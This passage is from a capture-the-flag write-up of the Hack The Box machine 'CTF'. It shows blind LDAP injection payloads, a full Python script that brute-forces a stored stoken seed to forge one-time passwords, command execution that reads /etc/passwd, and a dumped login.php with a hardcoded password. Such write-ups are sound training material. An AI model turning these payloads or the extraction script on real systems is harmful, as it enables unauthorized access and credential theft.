class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">000006:  C&#x3D;200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;*&quot;</span><br><span class="line">000003:  C&#x3D;200     68 L      229 W         2810 Ch        &quot;!@#%&quot;</span><br><span class="line">000004:  C&#x3D;200     68 L      229 W         2810 Ch        &quot;!@#%^&quot;</span><br><span class="line">000005:  C&#x3D;200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;&quot;</span><br><span class="line">000007:  C&#x3D;200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;*(&quot;</span><br><span class="line">000008:  C&#x3D;200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;*()&quot;</span><br><span class="line">000002:  C&#x3D;200     68 L      229 W         2810 Ch        &quot;!@#&quot;</span><br><span class="line">000010:  C&#x3D;200     68 L      229 W         2810 Ch        &quot;*****&quot;</span><br><span class="line">000065:  C&#x3D;200     68 L      229 W         2810 Ch        &quot;123456*a&quot;</span><br><span class="line">005121:  C&#x3D;200     68 L      229 W         2810 Ch        &quot;Ch4ng3m3!&quot;</span><br><span class="line">005723:  C&#x3D;200     68 L      229 W         2810 Ch        &quot;*%Cookie:&quot;</span><br><span class="line">009377:  C&#x3D;200     68 L      229 W         2810 Ch        &quot;!!Huawei&quot;</span><br><span class="line">011497:  C&#x3D;200     68 L      231 W         2822 Ch        &quot;ldapuser&quot;</span><br><span class="line">011866:  C&#x3D;200     68 L      234 W         2835 Ch        &quot;lost+found&quot;</span><br><span class="line">012611:  C&#x3D;200     68 L      233 W         2831 Ch        &quot;maurta&quot;^C</span><br><span class="line">Finishing pending requests...</span><br></pre></td></tr></table></figure>
<p> It worked and I didn’t get banned, after some time I got a result which was <code>ldapuser</code>, that’s weird. I also noticed that payloads that had special characters in them caused different response length. I tried <code>ldapuser</code> to see what’s the other message :<br><img src="/images/hackthebox/ctf/6.png" alt=""><br><img src="/images/hackthebox/ctf/7.png" alt=""><br>It was “Cannot login”<br>Then I tried <code>!@#%^&amp;*</code> and I got nothing, I just got the login page back again without any messages. I figured out that the username is being used in an <code>ldap</code> query, and it’s injectable (because of the special chars payloads). Also that existing attribute where the token is stored is an <code>ldap</code> attribute. With the injection we have we can extract the token and use it to generate valid <code>OTP</code>s. But because the injection is blind it will be kinda tricky to extract the token.</p>
<h2 id="LDAP-Injection"><a href="#LDAP-Injection" class="headerlink" title="LDAP Injection"></a>LDAP Injection</h2><p>As I said, it’s a blind injection which means that we won’t get any results. But a payload like this : <code>*)(uid=*))(|(uid=*</code>  should result in “Cannot login”. However when I tried it I didn’t get any message, So I tried to URL encode the payload and it worked. So the injection works when the payload is double URL encoded (I only encoded the payload once because the browser automatically encodes POST data). I switched to burp, here are the results :<br>Request :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ctf.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://ctf.htb/login.php</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 190</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=sqmpanb3d1uui0pf4uafubv010</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">inputUsername=%25%32%61%25%32%39%25%32%38%25%37%35%25%36%39%25%36%34%25%33%64%25%32%61%25%32%39%25%32%39%25%32%38%25%37%63%25%32%38%25%37%35%25%36%39%25%36%34%25%33%64%25%32%61&amp;inputOTP=0000</span><br></pre></td></tr></table></figure>
<p>Response :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Fri, 19 Jul 2019 17:58:29 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16</span><br><span class="line"><span class="attribute">X-Powered-By</span>: PHP/5.4.16</span><br><span class="line"><span class="attribute">Expires</span>: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Content-Length</span>: 2822</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang="en"&gt;</span><br><span class="line">	---------</span><br><span class="line">	 Removed</span><br><span class="line">	---------</span><br><span class="line">    &lt;div class="col-sm-10"&gt;</span><br><span class="line">    Cannot login    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">	---------</span><br><span class="line">	 Removed</span><br><span class="line">	---------</span><br></pre></td></tr></table></figure>
<p>Now we need to know which attribute the token is stored in. We know it’s an existing attribute so we just need to choose the right one. I checked <a href="https://docs.bmc.com/docs/fpsc121/ldap-attributes-and-associated-fields-495323340.html" target="_blank" rel="noopener"><code>ldap</code> attributes</a> and chose some of them to test (<code>comment</code>, <code>pager</code> and <code>info</code>), the payload will be like this : <code>*)(uid=*))(|(ATTRIBUTE=*</code> (instead of the second <code>uid</code> attribute we will use the attribute we are testing). We also know that the token is numeric so we can remove <code>*</code> and replace it with numeric values from 0 to 9 and monitor the responses (I used burp intruder to do this). So the final payload will be like this : <code>*)(uid=*))(|(ATTRIBUTE=N</code>. After some testing this payload with the attribute <code>pager</code> and value of 2 : <code>*)(uid=*))(|(pager=2</code> resulted in “Cannot login” message. Great so our payload will be <code>*)(uid=*))(|(pager=2N</code> and we will bruteforce the second number again until we get “Cannot login”. We will keep repeating this until we reach the 81st number, but doing this manually is lame and boring so I wrote a python script.</p>
<h2 id="Exploitation-Token-Extraction"><a href="#Exploitation-Token-Extraction" class="headerlink" title="Exploitation, Token Extraction"></a>Exploitation, Token Extraction</h2><p>I created 3 functions : </p>
<ul>
<li><code>send_payload</code>  (to send the injection payload and receive the response)</li>
<li><code>check_response</code> (to check whether the response contains “Cannot login” or not)</li>
<li><code>exploit</code> : This function creates a list of numbers from 0 to 9, then by looping through that list it creates the payload which is : <code>%2A%29%28uid%3D%2A%29%29%28%7C%28pager%3D</code> + token + number + <code>%2A</code> (encoded only once because python requests automatically encodes POST data). Then it calls <code>send_payload</code> and <code>check_response</code>, if <code>check_response</code> returned <code>True</code> it adds the valid number to the token.</li>
</ul>
<p>Then I wrote a <code>while</code> loop to keep calling <code>exploit()</code> as long as <code>len(token)</code> is not 81 </p>
<p><code>extract_token.py</code> :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">YELLOW = <span class="string">"\033[93m"</span></span><br><span class="line">GREEN = <span class="string">"\033[32m"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span><span class="params">(payload)</span>:</span></span><br><span class="line">	post_data = &#123;<span class="string">"inputUsername"</span>:payload,<span class="string">"inputOTP"</span>:<span class="string">"0000"</span>&#125;</span><br><span class="line">	req = requests.post(<span class="string">"http://10.10.10.122/login.php"</span>,data=post_data)</span><br><span class="line">	response = req.text</span><br><span class="line">	<span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_response</span><span class="params">(response)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">"Cannot login"</span> <span class="keyword">in</span> response:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> token</span><br><span class="line">	n_list = [n <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">10</span>)]</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> n_list:</span><br><span class="line">		payload = <span class="string">"%2A%29%28uid%3D%2A%29%29%28%7C%28pager%3D&#123;&#125;&#123;&#125;%2A"</span>.format(token,str(i))</span><br><span class="line">		response = send_payload(payload)</span><br><span class="line">		<span class="keyword">if</span> check_response(response):</span><br><span class="line">			token+=str(i)</span><br><span class="line"></span><br><span class="line">token = <span class="string">""</span></span><br><span class="line">print(YELLOW + <span class="string">"[*] Extracting Token"</span>)</span><br><span class="line"><span class="keyword">while</span> len(token) != <span class="number">81</span>:</span><br><span class="line">	exploit()</span><br><span class="line">	sys.stdout.write(<span class="string">"\r"</span> + YELLOW + <span class="string">"[*] Status : "</span> + token)</span><br><span class="line">	sys.stdout.flush()</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	print(GREEN + <span class="string">"\n[!] Done !"</span>)</span><br><span class="line">	print(GREEN + <span class="string">"[*] Token : "</span> + token)</span><br></pre></td></tr></table></figure>

<p><img src="/images/hackthebox/ctf/8.gif" alt=""><br>It took some minutes to finish and now we have the token :<br><img src="/images/hackthebox/ctf/9.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">285449490011357156531651545652335570713167411445727140604172141456711102716717000</span><br></pre></td></tr></table></figure>
<p>I installed <a href="https://github.com/cernekee/stoken" target="_blank" rel="noopener"><code>stoken</code></a> (<code>apt-get install stoken</code>), Then I imported the token :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stoken import --token 285449490011357156531651545652335570713167411445727140604172141456711102716717000</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/ctf/10.png" alt=""><br>I didn’t type any password I left it blank. We can either use the <code>cli</code> or the <code>gui</code>, for the <code>cli</code> you have to start <code>stoken</code> and enter the pin then you will get the <code>OTP</code>, and for another <code>OTP</code> you’ll need to start <code>stoken</code> again.<br><img src="/images/hackthebox/ctf/11.png" alt=""><br>So I just used the <code>gui</code> as it’s better :<br><img src="/images/hackthebox/ctf/12.png" alt=""></p>
<h2 id="RCE-User-Flag"><a href="#RCE-User-Flag" class="headerlink" title="RCE, User Flag"></a>RCE, User Flag</h2><p>Let’s login and see what’s there :<br><img src="/images/hackthebox/ctf/13.png" alt=""><br><code>%2a%29%28uid%3d%2a%29%29%28%7c%28uid%3d%2a</code> is <code>*)(uid=*))(|(uid=*</code> url-encoded.<br>It redirected me to <code>/page.php</code> which I can use to execute commands :<br><img src="/images/hackthebox/ctf/14.png" alt=""><br>I tried <code>whoami</code> and it worked fine:<br><img src="/images/hackthebox/ctf/15.png" alt=""><br>I switched to burp to make things easier, I wanted to read <code>/etc/passwd</code> to know the users :<br>Request :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/page.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ctf.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://ctf.htb/page.php</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 42</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=jj0dlekfhl2pggbo50bg4dkeu0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">inputCmd=cat /etc/passwd&amp;inputOTP=52447058</span><br></pre></td></tr></table></figure>
<p>Response :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Fri, 19 Jul 2019 21:58:13 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16</span><br><span class="line"><span class="attribute">X-Powered-By</span>: PHP/5.4.16</span><br><span class="line"><span class="attribute">Expires</span>: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Content-Length</span>: 4005</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang="en"&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">        ----------------</span><br><span class="line">         Removed Output</span><br><span class="line">        ----------------</span><br><span class="line">&lt;pre&gt;root:x:0:0:root:/root:/bin/bash</span><br><span class="line"><span class="attribute">bin:x:1:1:bin:/bin:/sbin/nologin</span></span><br><span class="line"><span class="attribute">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span></span><br><span class="line"><span class="attribute">adm:x:3:4:adm:/var/adm:/sbin/nologin</span></span><br><span class="line"><span class="attribute">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span></span><br><span class="line"><span class="attribute">sync:x:5:0:sync:/sbin:/bin/sync</span></span><br><span class="line"><span class="attribute">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span></span><br><span class="line"><span class="attribute">halt:x:7:0:halt:/sbin:/sbin/halt</span></span><br><span class="line"><span class="attribute">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span></span><br><span class="line"><span class="attribute">operator:x:11:0:operator:/root:/sbin/nologin</span></span><br><span class="line"><span class="attribute">games:x:12:100:games:/usr/games:/sbin/nologin</span></span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line"><span class="attribute">nobody:x:99:99:Nobody:/:/sbin/nologin</span></span><br><span class="line">systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin</span><br><span class="line">dbus:x:81:81:System message bus:/:/sbin/nologin</span><br><span class="line">polkitd:x:999:998:User for polkitd:/:/sbin/nologin</span><br><span class="line"><span class="attribute">apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin</span></span><br><span class="line">libstoragemgmt:x:998:997:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin</span><br><span class="line"><span class="attribute">abrt:x:173:173::/etc/abrt:/sbin/nologin</span></span><br><span class="line">rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span><br><span class="line"><span class="attribute">postfix:x:89:89::/var/spool/postfix:/sbin/nologin</span></span><br><span class="line"><span class="attribute">ntp:x:38:38::/etc/ntp:/sbin/nologin</span></span><br><span class="line"><span class="attribute">chrony:x:997:995::/var/lib/chrony:/sbin/nologin</span></span><br><span class="line"><span class="attribute">tcpdump:x:72:72::/:/sbin/nologin</span></span><br><span class="line">ldap:x:55:55:OpenLDAP server:/var/lib/ldap:/sbin/nologin</span><br><span class="line">saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin</span><br><span class="line"><span class="attribute">ldapuser:x:1000:1000::/home/ldapuser:/bin/bash</span></span><br><span class="line"><span class="attribute">&lt;/pre&gt;</span></span><br><span class="line">        ----------------</span><br><span class="line">         Removed Output</span><br><span class="line">        ----------------</span><br></pre></td></tr></table></figure>
<p>We can see that <code>ldapuser</code> is an actual user on the box, I tried to get a reverse shell but for some reason I couldn’t get a reverse shell at all so I started to look in the web files. I was already in the web directory :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inputCmd&#x3D;pwd&amp;inputOTP&#x3D;14546713</span><br><span class="line"></span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure>
<p>I listed the files :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">inputCmd&#x3D;ls -la&amp;inputOTP&#x3D;14546713</span><br><span class="line"></span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x. 6 root   root    176 Oct 23  2018 .</span><br><span class="line">drwxr-xr-x. 4 root   root     33 Jun 27  2018 ..</span><br><span class="line">-rw-r--r--. 1 root   root      0 Jul 20 00:03 banned.txt</span><br><span class="line">-rw-r-----. 1 root   apache 1424 Oct 23  2018 cover.css</span><br><span class="line">drwxr-x--x. 2 root   apache 4096 Oct 23  2018 css</span><br><span class="line">drwxr-x--x. 4 root   apache   27 Oct 23  2018 dist</span><br><span class="line">-rw-r-----. 1 root   apache 2592 Oct 23  2018 index.html</span><br><span class="line">drwxr-x--x. 2 root   apache  242 Oct 23  2018 js</span><br><span class="line">-rw-r-----. 1 root   apache 5021 Oct 23  2018 login.php</span><br><span class="line">-rw-r-----. 1 root   apache   68 Oct 23  2018 logout.php</span><br><span class="line">-rw-r-----. 1 root   apache 5245 Oct 23  2018 page.php</span><br><span class="line">-rw-r-----. 1 root   apache 2324 Oct 23  2018 status.php</span><br><span class="line">drwxr-x--x. 2 apache apache    6 Oct 23  2018 uploads</span><br></pre></td></tr></table></figure>
<p>I started looking for any hardcoded credentials in the <code>php</code> files, in <code>login.php</code> I found credentials for <code>ldapuser</code> :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">inputCmd=cat login.php&amp;inputOTP=<span class="number">04181897</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$strErrorMsg=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$username = <span class="string">'ldapuser'</span>;</span><br><span class="line">$password = <span class="string">'e398e27d5c4ad45086fe431120932a01'</span>;</span><br><span class="line"></span><br><span class="line">$basedn = <span class="string">'dc=ctf,dc=htb'</span>;</span><br><span class="line">$usersdn = <span class="string">'cn=users'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This code uses the START_TLS command</span></span><br><span class="line"></span><br><span class="line">$ldaphost = <span class="string">"ldap://ctf.htb"</span>;</span><br><span class="line">$ldapUsername  = <span class="string">"cn=$username"</span>;</span><br><span class="line"></span><br><span class="line">$ds = ldap_connect($ldaphost);</span><br><span class="line">$dn = <span class="string">"uid=ldapuser,ou=People,dc=ctf,dc=htb"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//var_dump($_POST);</span></span><br><span class="line">    $username1 = $_POST[<span class="string">'inputUsername'</span>];</span><br><span class="line">    $OPT1 = $_POST[<span class="string">'inputOTP'</span>];</span><br><span class="line"></span><br><span class="line">    $regex=<span class="string">'/[()*&amp;|!=&gt;&lt;~]/'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match($regex, $username1)) &#123;</span><br><span class="line">        $username2 = urldecode($username1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!ldap_set_option($ds, LDAP_OPT_PROTOCOL_VERSION, <span class="number">3</span>))&#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Could not set LDAPv3\r\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!ldap_start_tls($ds)) &#123;</span><br><span class="line">           <span class="keyword">print</span> <span class="string">"Could not start secure TLS connection"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// now we need to bind to the ldap server</span></span><br><span class="line">            $bth = ldap_bind($ds, $dn, $password) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"\r\nCould not connect to LDAP server\r\n"</span>);</span><br><span class="line"></span><br><span class="line">            $filter = <span class="string">"(&amp;(objectClass=inetOrgPerson)(uid=$username2))"</span>;</span><br><span class="line">            <span class="comment">// fix to be sure that the user has a token string in the db. Without it you can bypass the OTP check with no token in the input form!</span></span><br><span class="line">            $filter = <span class="string">"(&amp;(&amp;(objectClass=inetOrgPerson)(uid=$username2))(pager=*))"</span>;</span><br><span class="line">            <span class="comment">//echo $filter.PHP_EOL;</span></span><br><span class="line">            <span class="keyword">if</span> ($search=@ldap_search($ds, $basedn, $filter)) &#123;</span><br><span class="line">                $info = ldap_get_entries($ds, $search);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>($info[<span class="string">"count"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    $token_string = $info[<span class="number">0</span>][<span class="string">'pager'</span>][<span class="number">0</span>];</span><br><span class="line">                    <span class="comment">//echo $token_string;</span></span><br><span class="line">                    $token = exec(<span class="string">"/usr/bin/stoken --token=$token_string --pin=0000"</span>);</span><br><span class="line">                    <span class="keyword">if</span>($token == $OPT1) &#123;</span><br><span class="line">                        $strErrorMsg = <span class="string">"Login ok"</span>;</span><br><span class="line">                        $_SESSION[<span class="string">'username'</span>] = $username1;</span><br><span class="line">                        header (<span class="string">'Location: /page.php'</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        $strErrorMsg = <span class="string">"Cannot login"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    $strErrorMsg = <span class="string">"User $username1 not found"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>ldapuser : e398e27d5c4ad45086fe431120932a01</code><br><code>ssh</code> :<br><img src="/images/hackthebox/ctf/16.png" alt=""><br>We owned user.</p>
<h2 id="7z-List-Files-and-Wildcards-Root-Flag"><a href="#7z-List-Files-and-Wildcards-Root-Flag" class="headerlink" title="7z List Files and Wildcards, Root Flag"></a>7z List Files and Wildcards, Root Flag</h2><p>Before enumerating anything I just checked the directories and stuff like that, in <code>/</code> I saw a directory called <code>backup</code></p>
